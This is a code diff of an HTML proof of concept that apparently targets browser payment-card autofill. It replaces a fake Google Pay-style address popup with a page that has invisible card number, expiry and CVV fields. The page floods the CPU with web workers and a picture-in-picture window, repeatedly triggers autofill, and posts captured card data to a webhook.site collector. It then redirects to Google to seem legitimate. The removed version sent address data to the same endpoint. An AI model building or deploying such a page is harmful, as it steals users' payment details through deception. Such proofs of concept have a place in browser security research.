@@ -1,249 +1,260 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Address Autofill Demo</title>
+    <title>Credit Card Race Condition PoC</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-        
         body {
-            background: #f5f5f5;
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-        }
-        
-        .container {
-            width: 380px;
-            background: white;
-            border-radius: 12px;
+            margin: 0;
+            height: 100vh;
             overflow: hidden;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
         
-        .header {
-            padding: 16px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        
-        .header h2 {
-            font-size: 18px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 4px;
-        }
-        
-        .header p {
-            font-size: 14px;
-            color: #5f6368;
-        }
-        
-        .domain {
-            font-weight: 500;
-            color: #1a73e8;
-        }
-        
-        .content {
-            padding: 16px;
-        }
-        
-        .info-box {
-            background: #f8f9fa;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            padding: 16px;
-            margin-bottom: 16px;
+        .credit-card-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
             position: relative;
+            z-index: 10;
         }
         
-        .info-box::before {
-            content: '';
-            position: absolute;
-            top: -8px;
-            left: 24px;
-            width: 14px;
-            height: 14px;
-            background: #f8f9fa;
-            border-top: 1px solid #e0e0e0;
-            border-left: 1px solid #e0e0e0;
-            transform: rotate(45deg);
+        .credit-card-container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            text-align: center;
         }
         
-        .address-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-        }
-        
-        .address-icon {
-            width: 36px;
-            height: 36px;
-            background: #e8f0fe;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #1a73e8;
-            font-size: 20px;
-        }
-        
-        .address-details {
-            flex: 1;
-        }
-        
-        .address-name {
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 4px;
-        }
-        
-        .address-line {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 2px;
-        }
-        
-        .badge {
-            font-size: 12px;
-            color: #5f6368;
-            margin-top: 4px;
-        }
-        
-        .action-button {
+        .credit-card-container input[type="submit"] {
             width: 100%;
-            background: #1a73e8;
+            padding: 10px;
+            background-color: #4CAF50;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            position: relative;
+            z-index: 20;
+        }
+        
+        .credit-card-container input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        
+        #raceButton {
+            width: 300px;
+            padding: 15px;
+            background-color: #ff4444;
             color: white;
             border: none;
-            border-radius: 20px;
-            padding: 12px;
-            font-size: 16px;
-            font-weight: 500;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
             cursor: pointer;
-            margin-bottom: 12px;
-            transition: background 0.2s;
+            position: relative;
+            z-index: 30;
         }
         
-        .action-button:hover {
-            background: #1557b0;
-        }
-        
-        .keyboard-option {
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            background: #333;
+            color: #fff;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            width: 300px;
             text-align: center;
-            color: #1a73e8;
-            font-size: 14px;
-            cursor: pointer;
-            padding: 8px;
-        }
-        
-        .keyboard-option:hover {
-            background: #f1f3f4;
-            border-radius: 4px;
-        }
-        
-        hr {
-            border: none;
-            border-top: 1px solid #e0e0e0;
-            margin: 16px 0;
-        }
-        
-        .hidden-fields {
-            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h2>Continue Click On Submit Button</h2>
-            <p>You'll fill info into <span class="domain">kenz1us.github.io</span></p>
-        </div>
-        
-        <div class="content">
-            <!-- Fake pop-up yang menyerupai Gpay untuk alamat -->
-            <div class="info-box">
-                <div class="address-item">
-                    <div class="address-icon">📍</div>
-                    <div class="address-details">
-                        <div class="address-name">Rumah</div>
-                        <div class="address-line">Jl. Sudirman No. 123</div>
-                        <div class="address-line">Jakarta Pusat, DKI Jakarta 12345</div>
-                        <div class="address-line">Indonesia</div>
-                        <div class="badge">+62 812 3456 7890</div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Tombol Continue -->
-            <button class="action-button" id="continueBtn">Continue</button>
-            
-            <!-- Opsi Use keyboard -->
-            <div class="keyboard-option">Use keyboard</div>
-            
-            <!-- Hidden form untuk autofill address -->
-            <div style="height: 0; overflow: hidden;">
-                <form id="addressForm" action="https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c" method="POST">
-                    <input type="text" id="fullname" name="fullname" value="Budi Santoso">
-                    <input type="text" id="street" name="street" value="Jl. Sudirman No. 123">
-                    <input type="text" id="city" name="city" value="Jakarta Pusat">
-                    <input type="text" id="state" name="state" value="DKI Jakarta">
-                    <input type="text" id="zipcode" name="zipcode" value="12345">
-                    <input type="text" id="country" name="country" value="Indonesia">
-                    <input type="text" id="phone" name="phone" value="+62 812 3456 7890">
-                </form>
-            </div>
-        </div>
+    <div class="credit-card-container">
+        <h2>💳 Credit Card Form</h2>
+        <form id="creditCardForm" action="https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c" method="POST">
+            <!-- Hidden fields - tapi kita akan trigger autofill -->
+            <input type="text" id="cardnumber" name="cardnumber" placeholder="Card Number" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:40px;">
+            <input type="text" id="expiry" name="expiry" placeholder="Expiry (MM/YY)" style="opacity:0; position:absolute; top:50px; left:0; width:100%; height:40px;">
+            <input type="text" id="cvv" name="cvv" placeholder="CVV" style="opacity:0; position:absolute; top:100px; left:0; width:100%; height:40px;">
+            <input type="submit" value="Submit Payment">
+        </form>
     </div>
     
+    <!-- Tombol untuk memulai race condition -->
+    <button id="raceButton">🔥 START RACE CONDITION (1 CLICK) 🔥</button>
+    
+    <div class="status" id="status">Ready. Click button to start race.</div>
+
     <script>
-        document.getElementById('continueBtn').addEventListener('click', function() {
-            // Kirim data ke webhook
-            const form = document.getElementById('addressForm');
-            const formData = new FormData(form);
-            const data = {};
-            formData.forEach((value, key) => {
-                data[key] = value;
-            });
+        let raceActive = false;
+        let workers = [];
+        let workerCount = 0;
+        const statusDiv = document.getElementById('status');
+        
+        // Fungsi untuk membuat banyak workers
+        function spawnWorkers(count) {
+            for (let i = 0; i < count; i++) {
+                try {
+                    // Worker dengan kode minimal untuk membebani CPU
+                    const worker = new Worker('data:application/javascript,' + 
+                        encodeURIComponent(`
+                            // Worker ${i} - heavy computation
+                            let x = 0;
+                            for(let j = 0; j < 1000000; j++) {
+                                x += Math.random();
+                            }
+                            // Loop terus menerus
+                            setInterval(() => {
+                                let y = 0;
+                                for(let k = 0; k < 100000; k++) {
+                                    y += Math.sqrt(k);
+                                }
+                            }, 1);
+                        `)
+                    );
+                    workers.push(worker);
+                    workerCount++;
+                } catch(e) {
+                    console.log('Worker error:', e);
+                }
+            }
+            statusDiv.innerHTML = `🧠 Workers created: ${workerCount}`;
+        }
+        
+        // Fungsi untuk memicu autofill dengan timing yang tepat
+        function triggerAutofill() {
+            // Fokus ke field cardnumber untuk memicu autofill
+            document.getElementById('cardnumber').focus();
             
-            // Tambah metadata
-            data.timestamp = new Date().toISOString();
-            data.type = 'address_autofill';
-            data.userAgent = navigator.userAgent;
+            // Simulasi klik pada opsi autofill (ini akan memicu bottom sheet)
+            // Dalam skenario nyata, user akan melihat bottom sheet dan "klik"
             
-            // Kirim ke webhook
-            fetch('https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c', {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            });
+            // Dispatch event untuk memicu autofill
+            const event = new Event('input', { bubbles: true });
+            document.getElementById('cardnumber').dispatchEvent(event);
             
-            // Visual feedback
-            const btn = this;
-            const originalText = btn.textContent;
-            btn.textContent = '✓ Address Sent!';
-            btn.style.background = '#34a853';
-            
+            // Setelah autofill terisi, submit form
             setTimeout(() => {
-                btn.textContent = originalText;
-                btn.style.background = '#1a73e8';
-            }, 2000);
+                if(document.getElementById('cardnumber').value.length > 0) {
+                    document.getElementById('creditCardForm').submit();
+                    statusDiv.innerHTML = '✅ FORM SUBMITTED!';
+                } else {
+                    statusDiv.innerHTML = '⏳ Autofill not triggered yet...';
+                }
+            }, 100);
+        }
+        
+        // Fungsi utama race condition
+        async function startRace() {
+            if(raceActive) return;
+            raceActive = true;
             
-            console.log('Address data sent:', data);
+            statusDiv.innerHTML = '🏁 RACE STARTED!';
+            
+            // 1. Spawn banyak workers untuk membebani thread
+            spawnWorkers(50);
+            
+            // 2. Buat interval untuk terus spawn workers
+            const workerInterval = setInterval(() => {
+                spawnWorkers(5);
+            }, 10);
+            
+            // 3. Coba buka Picture-in-Picture window untuk tambahan load
+            try {
+                if ('documentPictureInPicture' in window) {
+                    const pipWindow = await documentPictureInPicture.requestWindow({
+                        width: 400,
+                        height: 600
+                    });
+                    
+                    // Isi dengan konten yang juga jalanin script berat
+                    pipWindow.document.write(`
+                        <html>
+                            <body>
+                                <script>
+                                    setInterval(() => {
+                                        for(let i=0; i<10000; i++) {
+                                            Math.random();
+                                        }
+                                    }, 1);
+                                <\/script>
+                            </body>
+                        </html>
+                    `);
+                }
+            } catch(e) {
+                console.log('PiP error:', e);
+            }
+            
+            // 4. Loop cepat untuk trigger autofill berulang kali
+            let attempts = 0;
+            const autofillInterval = setInterval(() => {
+                triggerAutofill();
+                attempts++;
+                statusDiv.innerHTML = `🎯 Attempt #${attempts} - Workers: ${workerCount}`;
+                
+                // Setelah 100 attempts, coba redirect
+                if(attempts > 100) {
+                    clearInterval(autofillInterval);
+                    clearInterval(workerInterval);
+                    
+                    // Redirect ke Google biar keliatan legitimate
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 2000);
+                    
+                    statusDiv.innerHTML = '🏁 RACE COMPLETE - Check webhook!';
+                }
+            }, 5); // Interval 5ms - sangat cepat
+            
+            // 5. Juga pakai requestAnimationFrame untuk timing presisi
+            function rafLoop() {
+                if(!raceActive) return;
+                
+                // Trigger tambahan di setiap frame
+                document.getElementById('cardnumber').focus();
+                
+                if(attempts < 200) {
+                    requestAnimationFrame(rafLoop);
+                }
+            }
+            requestAnimationFrame(rafLoop);
+            
+            // 6. Multiple timers dengan berbagai delay
+            for(let delay = 1; delay <= 20; delay++) {
+                setTimeout(triggerAutofill, delay);
+                setTimeout(triggerAutofill, delay + 500); // Coba bypass 500ms protection
+            }
+        }
+        
+        // Event listener untuk tombol race
+        document.getElementById('raceButton').addEventListener('click', startRace);
+        
+        // Juga trigger race saat halaman di-load (untuk testing)
+        // startRace(); // Uncomment untuk auto-start
+        
+        // Monitor input fields
+        document.getElementById('cardnumber').addEventListener('input', function(e) {
+            if(this.value.length > 0) {
+                console.log('Card number detected:', this.value);
+                statusDiv.innerHTML = '💳 Card detected!';
+            }
         });
         
-        // Opsi keyboard
-        document.querySelector('.keyboard-option').addEventListener('click', function() {
-            alert('Manual entry - but data already captured!');
-        });
+        // Log untuk debugging
+        console.log('Race Condition PoC Ready');
+        console.log('Target: Credit Card Autofill');
+        console.log('Webhook: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c');
     </script>
 </body>
 </html>
